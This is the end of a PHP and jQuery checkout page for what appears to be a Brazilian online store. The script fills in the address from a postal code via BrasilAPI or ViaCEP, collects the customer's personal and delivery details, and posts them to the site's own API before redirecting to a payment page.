                            $('#estado').val(json.state || '');
                            
                            // Salva as coordenadas para o cálculo de distância do Haversine
                            if (json.location && json.location.coordinates) {
                                userLng = json.location.coordinates.longitude;
                                userLat = json.location.coordinates.latitude;
                            } else {
                                userLat = null;
                                userLng = null;
                            }
                            
                            // Mostra os campos extras
                            $('#endereco-extra').removeClass('hidden').hide().slideDown();
                            $('#forma-entrega-section').removeClass('hidden').hide().slideDown();
                            
                            // Seleciona o padrão automaticamente
                            const btnPadrao = $(`.frete-btn[data-valor="0"]`).first()[0];
                            selectFrete('padrao', 0, btnPadrao);

                            if (!json.street) {
                                $('#rua').focus();
                            } else {
                                $('#numero').focus();
                            }
                        }
                    }).fail(function() {
                        // Se falhar a BrasilAPI, tenta ViaCEP como fallback
                        $.getJSON('https://viacep.com.br/ws/' + cep + '/json/', function(json){
                            if(!json.erro) {
                                $('#rua').val(json.logradouro || '');
                                $('#bairro').val(json.bairro || '');
                                $('#cidade').val(json.localidade || '');
                                $('#estado').val(json.uf || '');
                                
                                userLat = null; // Sem coordenadas no fallback
                                userLng = null;
                                
                                $('#endereco-extra').removeClass('hidden').hide().slideDown();
                                $('#forma-entrega-section').removeClass('hidden').hide().slideDown();
                                
                                const btnPadrao = $(`.frete-btn[data-valor="0"]`).first()[0];
                                selectFrete('padrao', 0, btnPadrao);
                                $('#numero').focus();
                            }
                        });
                    });
                }
            });
            // Removido evento duplicado das frete-btn para não dar conflito com o onclick
        });

        function proceed() {
            const formData = {
                nome: $('#nome').val(),
                email: $('#email').val(),
                cpf: $('#cpf').val().replace(/\D/g, ''),
                telefone: $('#telefone').val().replace(/\D/g, ''),
                cep: $('#cep').val().replace(/\D/g, ''),
                rua: $('#rua').val() || '',
                numero: $('#numero').val() || '',
                bairro: $('#bairro').val() || '',
                cidade: $('#cidade').val() || '',
                estado: $('#estado').val() || '',
                complemento: $('#complemento').val() || '',
                referencia: '',
                tipo: $('#tipo-frete').val() || 'padrao'
            };
            
            if(formData.cpf.length !== 11) {
                alert("Por favor, digite um CPF válido com 11 dígitos.");
                return;
            }

            localStorage.setItem('cliente_dados', JSON.stringify(formData));
            
            $('#btnSubmit')
                .prop('disabled', true)
                .addClass('opacity-70')
                .html('<svg class="animate-spin h-5 w-5 text-white mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>');

            const cartData = JSON.parse(localStorage.getItem('lojavirtual') || '{"quantos":"1","precoFinal":"0,00"}');
            const vSel = localStorage.getItem('variacoes_selecionadas') || '{}';
            
            const payloadCompleto = btoa(unescape(encodeURIComponent(JSON.stringify({
                api: 'salvar_cadastro',
                nome: formData.nome,
                email: formData.email,
                cpf: formData.cpf,
                celular: formData.telefone,
                telefone: formData.telefone,
                cep: formData.cep,
                endereco: formData.rua,
                rua: formData.rua,
                numero: formData.numero,
                bairro: formData.bairro,
                cidade: formData.cidade,
                estado: formData.estado,
                complemento: formData.complemento,
                destinatario: formData.nome,
                quantidade: cartData.quantos || '1',
                total: cartData.precoFinal || '0,00',
                valortotal: cartData.precoFinal || '0,00',
                produto_codigo: codigoProduto,
                produto_nome: "<?php echo addslashes($nomeproduto); ?>",
                variacoes: vSel
            }))));

            $.post('api/index.php', { p: payloadCompleto }, function(retorno) {
                if (String(retorno).trim() === 'ok') {
                    window.location.href = 'payment.php?produto=' + codigoProduto;
                } else {
                    $('#btnSubmit').prop('disabled', false).removeClass('opacity-70').html('Continuar');
                    alert('Não foi possível salvar seus dados.\n' + String(retorno).trim());
                }
            }).fail(function(){
                $('#btnSubmit').prop('disabled', false).removeClass('opacity-70').html('Continuar');
                alert('Erro na conexão. Verifique sua internet.');
            });
        }
    </script>
</body>
</html>
